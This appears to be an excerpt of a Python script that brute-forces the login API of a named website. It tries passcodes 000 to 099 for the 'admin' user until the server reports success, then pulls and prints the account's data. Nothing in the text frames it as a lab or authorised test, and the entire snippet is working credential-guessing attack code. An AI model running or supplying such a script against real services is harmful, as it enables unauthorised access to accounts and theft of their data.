...
url_login = 'https://overstudy.com/parathon/api/login'
url_info = 'https://overstudy.com/parathon/api/getinfo'
...
for number in range(100):
    payload = {
        'username' : 'admin',
        'passcode' : str(number).zfill(3)
    }

    cord = s.post(url_login, data = payload)
    find = cord.json().get('code')
    if find == 0:
        break
    elif find == 2:
        pass
...
data = s.get(url_info, params = info)
data_well = data.json()

print(data_well.get("data"))
